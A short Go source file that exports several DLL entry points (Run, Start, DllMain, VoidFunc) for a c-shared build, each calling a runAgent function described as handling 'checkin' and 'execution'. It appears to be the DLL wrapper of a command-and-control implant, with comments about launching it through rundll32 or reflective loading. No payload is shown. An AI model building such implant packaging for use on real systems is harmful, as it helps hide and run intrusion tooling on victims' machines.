//go:build shared
// +build shared

package main

import "C"

// These exported functions are only compiled when building with -buildmode=c-shared
// They all call the main agent logic which handles initialization, checkin, and execution

//export Run
func Run() {
	// Entry point for the DLL that can be called via rundll32 or reflective loading
	runAgent()
}

//export Start
func Start() {
	// Alternative entry point name
	runAgent()
}

//export DllMain
func DllMain() {
	// Windows DLL entry point that gets called on DLL_PROCESS_ATTACH
	// Note: This may have limitations with Go runtime initialization
	runAgent()
}

//export VoidFunc
func VoidFunc() {
	// Generic export that some loaders expect
	runAgent()
}
